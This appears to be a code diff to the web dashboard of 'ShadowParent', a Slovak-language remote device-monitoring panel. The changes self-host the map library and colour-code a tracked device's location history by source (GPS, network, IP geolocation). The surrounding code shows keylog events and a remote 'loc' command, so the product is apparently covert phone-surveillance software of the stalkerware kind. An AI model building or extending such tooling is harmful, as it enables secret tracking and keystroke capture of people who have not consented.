@@ -2,8 +2,7 @@
 <html lang="sk"><head><meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
 <title>ShadowParent · Dashboard</title>
-<link rel="preconnect" href="https://unpkg.com">
-<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
+<link rel="stylesheet" href="/static/leaflet/leaflet.css">
 <style>
 :root{
   --bg:#080b12; --bg2:#0b1120; --panel:#0f1626; --panel2:#131c2f; --panel3:#18223a;
@@ -475,7 +474,7 @@ td.mono,.mono{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;f
   <pre id="modalBody"></pre>
 </div></div>
 
-<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<script src="/static/leaflet/leaflet.js"></script>
 <script>
 const S = {device:null, view:'overview', devices:[], map:null, mini:null, track:null, q:''};
 const $ = id => document.getElementById(id);
@@ -511,6 +510,13 @@ const ICONS = {
 const icon = k => `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9"
   stroke-linecap="round" stroke-linejoin="round">${ICONS[k]||ICONS.default}</svg>`;
 
+const SRC_COLOR = {gps:'#22c55e', network:'#06b6d4', web:'#f59e0b'};
+const SRC_LABEL = {gps:'GPS', network:'sieť', web:'IP (web)'};
+function srcTag(src){
+  const s = (src||'gps').toLowerCase();
+  const c = SRC_COLOR[s]||'#8fa1c0';
+  return `<span class="tag" style="color:${c};border-color:${c}55;background:${c}18">${esc(SRC_LABEL[s]||s)}</span>`;
+}
 function kindTag(k){
   const base=k.replace('beacon:','');
   const map={boot:'blue',heartbeat:'green',health:'green',alive:'green',location:'cyan',keylog:'violet',
@@ -559,6 +565,7 @@ async function loadOverview(){
   const d = await j('/api/device/'+encodeURIComponent(S.device));
   if(!d) return;
   const dev=d.device||{}, meta=d.meta||{}, c=d.counts||{}, loc=d.last_location||{};
+  const web={loc:d.last_location_web||{}};
   const online = d.online;
   $('avatar').textContent = (dev.model||'?').slice(0,2).toUpperCase();
   $('devName').textContent = dev.model || S.device;
@@ -582,7 +589,9 @@ async function loadOverview(){
       <div class="v">${total}</div><div class="s">celkovo uložených</div></div>
     <div class="card tile" data-go="location"><div class="k">${icon('location')} Posledná poloha</div>
       <div class="v" style="font-size:17px">${loc.lat?loc.lat.toFixed(4)+', '+loc.lon.toFixed(4):'—'}</div>
-      <div class="s">${loc.ts?fmtAgo(loc.ts)+' · '+(loc.source||'gps'):'zatiaľ bez fixu'}</div></div>`;
+      <div class="s">${loc.ts?fmtAgo(loc.ts)+' · '+srcTag(loc.source):'zatiaľ bez fixu'}</div>
+      ${web.loc?`<div class="s">IP: ${web.loc.lat.toFixed(4)}, ${web.loc.lon.toFixed(4)} · ${fmtAgo(web.loc.ts)} ${srcTag('web')}</div>`:''}
+      </div>`;
   $('tiles').querySelectorAll('.tile').forEach(t=>t.addEventListener('click',()=>go(t.dataset.go)));
 
   const logs = await j('/api/logs?device_id='+encodeURIComponent(S.device)+'&limit=18')||[];
@@ -621,27 +630,42 @@ async function loadLocation(){
       <td class="mono">${fmtT(t.ts)}</td>
       <td class="mono">${(t.lat??'').toFixed?.(5)??t.lat}, ${(t.lon??'').toFixed?.(5)??t.lon}</td>
       <td>${t.accuracy!=null?Math.round(t.accuracy)+' m':'—'}</td>
-      <td>${esc(t.source||t.provider||'—')}</td></tr>`).join('')
+      <td>${srcTag(t.source||t.provider||'—')}</td></tr>`).join('')
     : '<tr><td colspan="4" class="empty">Zatiaľ žiadne polohy. Pošli príkaz <b>loc</b>.</td></tr>';
   drawMap(track);
 }
 function baseMap(el){
   const m = L.map(el,{zoomControl:true}).setView([48.1486,17.1077],6);
+  // The tiles need no API key; if the CDN is blocked the map still works -
+  // the background is plain, the markers and the track stay on top.
   L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png',
-    {attribution:'© OpenStreetMap © CARTO', maxZoom:19}).addTo(m);
+    {attribution:'© OpenStreetMap © CARTO', maxZoom:19, crossOrigin:true}).addTo(m);
   return m;
 }
 function drawMap(track){
   if(!S.map){ S.map=baseMap($('map')); }
   if(S.track){ S.track.remove(); S.track=null; }
   if(S.mapLayer){ S.mapLayer.remove(); S.mapLayer=null; }
+  if(S.marks){ S.marks.forEach(m=>m.remove()); S.marks=[]; }
   if(!track || !track.length){ return; }
   const pts = track.slice().reverse().map(t=>[t.lat,t.lon]);
   if(pts.length>1){
     S.track=L.polyline(pts,{color:'#4f7cff',weight:3,opacity:.9}).addTo(S.map);
   }
+  // Every fix is drawn with the colour of its source: green = GPS,
+  // cyan = network, orange = IP geolocation.
+  S.marks = track.slice(0,60).map(t=>{
+    const src=(t.source||'gps').toLowerCase();
+    const col=SRC_COLOR[src]||'#4f7cff';
+    return L.circleMarker([t.lat,t.lon],{radius:7,color:'#fff',weight:2,fillColor:col,fillOpacity:1})
+      .addTo(S.map)
+      .bindPopup(`<b>${esc(S.device)}</b><br>${t.lat.toFixed(5)}, ${t.lon.toFixed(5)}<br>`+
+                 `${fmtT(t.ts)} · ${esc(SRC_LABEL[src]||src)} · `+
+                 `${t.accuracy!=null?Math.round(t.accuracy)+' m':'—'}`);
+  });
   const last=track[0];
-  S.mapLayer=L.circleMarker([last.lat,last.lon],{radius:8,color:'#fff',weight:2,fillColor:'#4f7cff',fillOpacity:1})
+  const lastCol=SRC_COLOR[(last.source||'gps').toLowerCase()]||'#4f7cff';
+  S.mapLayer=L.circleMarker([last.lat,last.lon],{radius:11,color:'#fff',weight:3,fillColor:lastCol,fillOpacity:1})
     .addTo(S.map).bindPopup(`<b>${esc(S.device)}</b><br>${last.lat.toFixed(5)}, ${last.lon.toFixed(5)}<br>${fmtT(last.ts)}`);
   S.map.setView([last.lat,last.lon],14);
   setTimeout(()=>S.map.invalidateSize(),60);
@@ -650,7 +674,8 @@ function drawMini(loc){
   if(!S.mini){ S.mini=baseMap($('mapMini')); S.miniMini=false; }
   if(S.miniMark){ S.miniMark.remove(); S.miniMark=null; }
   if(!loc || !loc.lat) return;
-  S.miniMark=L.circleMarker([loc.lat,loc.lon],{radius:7,color:'#fff',weight:2,fillColor:'#22c55e',fillOpacity:1})
+  const col=SRC_COLOR[(loc.source||'gps').toLowerCase()]||'#22c55e';
+  S.miniMark=L.circleMarker([loc.lat,loc.lon],{radius:7,color:'#fff',weight:2,fillColor:col,fillOpacity:1})
     .addTo(S.mini).bindPopup(`${loc.lat.toFixed(5)}, ${loc.lon.toFixed(5)}`);
   S.mini.setView([loc.lat,loc.lon],12);
   setTimeout(()=>S.mini.invalidateSize(),60);
